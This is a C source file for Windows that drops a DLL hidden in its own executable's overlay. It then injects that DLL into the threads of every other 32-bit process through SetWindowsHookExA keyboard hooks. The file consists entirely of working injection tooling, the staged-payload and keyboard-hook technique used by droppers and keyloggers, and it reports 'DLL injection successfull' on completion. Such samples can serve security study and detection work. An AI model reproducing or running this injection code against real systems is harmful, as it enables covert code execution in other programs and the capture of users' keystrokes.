#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h> 

typedef void* HANDLE;

size_t dllSize = 0;
char *dll = NULL;

DWORD threadIDsArray[256];
HHOOK hHooks[256];
int MmaxElements = 256;

int is64bit(long pid) {
    SYSTEM_INFO sysinfo;
    HANDLE hProcess;
    BOOL isWow64;

    // if OS is not 64 bit, no process will be either   
    GetNativeSystemInfo(&sysinfo);
    if (sysinfo.wProcessorArchitecture != PROCESSOR_ARCHITECTURE_AMD64) 
        return 0;

    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);;
    if (hProcess == NULL)
        return -1;

    if (! IsWow64Process(hProcess, &isWow64)) {
        CloseHandle(hProcess);
        return -1;
    }

    CloseHandle(hProcess);
    if (isWow64)
        return 0;
    else
        return 1;
}

//get offset of overlay
int getSizeOfPeFile(){
    HMODULE baseAddress = GetModuleHandle(NULL);

    IMAGE_DOS_HEADER* IDH = (IMAGE_DOS_HEADER*)baseAddress;

    IMAGE_NT_HEADERS* INH = (IMAGE_NT_HEADERS*)((int)baseAddress + IDH->e_lfanew);

    int size = INH->OptionalHeader.SizeOfHeaders;

    DWORD sectionLocation = (DWORD)INH + sizeof(DWORD) /*PE signature*/ + (DWORD)(sizeof(IMAGE_FILE_HEADER)) + (DWORD)INH->FileHeader.SizeOfOptionalHeader;

    DWORD sectionSize = (DWORD)sizeof(IMAGE_SECTION_HEADER); //40 bytes

    DWORD importDirectoryRVA = INH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

    for (int i = 0; i < INH->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)sectionLocation;
        size = size + sectionHeader->SizeOfRawData;
        sectionLocation = sectionLocation +sectionSize;
    }

    return size;
}   

void getOverlay(){
    int offsetOfOverlay = getSizeOfPeFile();
    char *fileName = (char *)malloc(MAX_PATH);
    GetModuleFileNameA(NULL,fileName,MAX_PATH);
    if( strlen(fileName) == 0){
        perror("Could not retrive filename.\n");
        exit(EXIT_FAILURE);
    }

    FILE *fp = fopen(fileName, "rb"); // read mode

    if (fp == NULL){
        perror("Error while opening the file.\n");
        exit(EXIT_FAILURE);
    }


    long int sizeOfFile = ftell(fp);

    if ( fseek(fp, offsetOfOverlay, SEEK_SET) != 0 ) {
        perror("Could not set the file position.\n");
        exit(EXIT_FAILURE);
    }

    fread(&dllSize, 4, 1, fp); //first 4 bytes of overlay are size of the file

    dll = (char *)malloc(dllSize);

    fread(dll, 1, dllSize, fp);

    fclose(fp);
}

//create DLL on disks
char* dropDll(){
    HANDLE hFile;
    char *fileName = "setWindowsHookExDllInjection.dll";

    getOverlay();

    hFile = CreateFileA(fileName, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); //create file
    if (hFile == INVALID_HANDLE_VALUE){
        return 0;
    }
    if(WriteFile(hFile, dll, dllSize, NULL, NULL)){
        //getting absoluthe path to created DLL
        TCHAR wd[MAX_PATH] = { 0 };
        GetCurrentDirectory(MAX_PATH, wd);
        char *filePath = (char *)malloc(MAX_PATH);
        strcpy(filePath, wd);
        filePath = strcat(filePath, "\\");
        filePath = strcat(filePath, fileName);
        CloseHandle(hFile);
        return filePath;
    }
    CloseHandle(hFile);
    return 0;
}

//get handles of only 32 bit threads, because DLL is 32 bit
int getRemoteThreadHandles(){
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    int index = 0;
    int ownPid = GetCurrentProcessId();

    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
    if (hThreadSnap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    if (!Thread32First(hThreadSnap, &te32)) {
        CloseHandle(hThreadSnap);
        return 0;
    }

    do {
        if (is64bit(te32.th32OwnerProcessID) == 0){ //check if is 32 bit
            if (te32.th32OwnerProcessID != ownPid) {
                threadIDsArray[index++] = te32.th32ThreadID; //save thread handle to array
            }
        }
        if(index >= MmaxElements){
            break;
        }
    } while (Thread32Next(hThreadSnap, &te32));
    
    CloseHandle(hThreadSnap);
    return index;
}

int setWindowsHookExDllInjection(){
    char *dllPath = (char *)dropDll();
    if (dllPath == 0){
        return 1; //DLL could not be created
    }

    HANDLE hDll = LoadLibraryA(dllPath);
    if (hDll == NULL){
        return 2;
    }

    LPVOID addressOfExport = GetProcAddress(hDll, "exampleExport");
    if (addressOfExport == NULL){
        return 3;
    }

    //get count of 32 bit threads and their TID store in global array threadIDsArray
    int handlesCount = getRemoteThreadHandles();
    
    if (handlesCount == 0){
        return 5;
    }

    //creates hooks for keyboard event
    for (int i = 0; i < handlesCount; i++){
        hHooks[i] = SetWindowsHookExA(WH_KEYBOARD, (HOOKPROC)addressOfExport, (HINSTANCE)hDll, (DWORD)threadIDsArray[i]);
    }

    system("pause");

    //release hooks
    for (int i = 0; i < handlesCount; i++){
        UnhookWindowsHookEx(hHooks[i]);
    }
}

int main(int argc, char *argv[]){
    switch (setWindowsHookExDllInjection())
    {
    case 0:
        MessageBox(0,"DLL injection successfull.","Success",0);
        return 0;
    case 1:
        MessageBox(0,"DLL injection failed. DLL could not be created.","Failure",0);
        return 1;
    case 2:
        MessageBox(0,"DLL injection failed. Dll could not be loaded.","Failure",0);
        return 1;
    case 3:
        MessageBox(0,"DLL injection failed. Address of export function could not be resolved.","Failure",0);
        return 1;
    case 4:
        MessageBox(0,"DLL injection failed. Hook could not be set.","Failure",0);
        return 1;
    case 5:
        MessageBox(0,"DLL injection failed. Could not get remote thread handles.","Failure",0);
        return 1;
    }
    
    return 1;
}
